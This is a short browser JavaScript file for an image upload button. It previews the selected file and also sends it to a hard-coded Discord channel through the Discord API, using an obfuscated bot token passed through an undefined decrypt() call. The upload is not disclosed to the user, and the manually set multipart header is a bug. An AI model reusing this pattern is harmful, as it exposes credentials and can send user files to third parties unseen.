document.addEventListener('DOMContentLoaded', function(){

    document.getElementById('upload-btn').addEventListener('click', function() {
        document.getElementById('file-input').click();
    });
    
    document.getElementById('file-input').addEventListener('change', function(event) {
        const file = event.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                const imgElement = document.getElementById('preview-img');
                imgElement.src = e.target.result;
                imgElement.style.display = 'block';
            }
            reader.readAsDataURL(file);

            const formData = new FormData();
            formData.append('file', file);
            fetch('https://discord.com/api/v10/channels/1146358218696691764/messages', {
                method: 'POST',
                body: formData,
                headers: {
                    'Content-Type': 'multipart/form-data',
                    'Authorization': decrypt('uY3ANQt+2c5P7zNDzoUvf3g5+HFOHsT6M2Rtrc3553eZKH5UCc50oxJxrHmptNaegb2TWzhlKySHnP6bJJWalfu6du4DKmdxgtsvMmokxXo='),
                }
            })
            .then(response => response.text())
            .then(data => {
                console.log(data);
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    });
})
